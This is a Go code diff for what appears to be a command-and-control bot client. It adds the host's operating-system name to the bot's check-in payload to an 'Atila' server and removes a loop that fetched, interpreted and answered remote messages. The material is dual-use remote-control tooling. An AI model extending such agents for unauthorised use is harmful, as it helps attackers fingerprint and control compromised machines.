@@ -51,6 +51,7 @@ type ReplyContent struct {
 type IdentifyPayload struct {
 	Id        string `json:"id"`        // UUID of the bot. (self-generated)
 	PublicKey string `json:"publicKey"` // Public key of the bot.
+	Os        string `json:"os"`        // Name of the operating system.
 	Status    string `json:"status"`    // Bot's status.
 }
 
@@ -60,44 +61,13 @@ type MessageAck struct {
 	Status string `json:"status"`
 }
 
-// inboxReader is a loop of fetching and interpreting messages.
-// Returns true if the operation was successful, false if it didn't.
-func inboxReader(host, id string) bool {
-	messages, err := fetchMessages(host, id)
-	if err != nil {
-		fmt.Println(err.Error())
-		return false
-	}
-
-	for _, message := range messages {
-		reply, err := interpretMessage(host, message)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-
-		err = sendMessage(host, reply)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-
-		err = messageAck(host, reply.ReplyTo)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-	}
-
-	return true
-}
-
 // identify makes the bot known to the Atila server. Returns true if identification was successful.
 func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	// Bot's identification details which will be stored in the Atila's database.
 	details := IdentifyPayload{
 		Id:        id,
 		PublicKey: publicKeyToPEM(publicKey),
+		Os:        osDetails().Os,
 		Status:    "ALIVE",
 	}
 
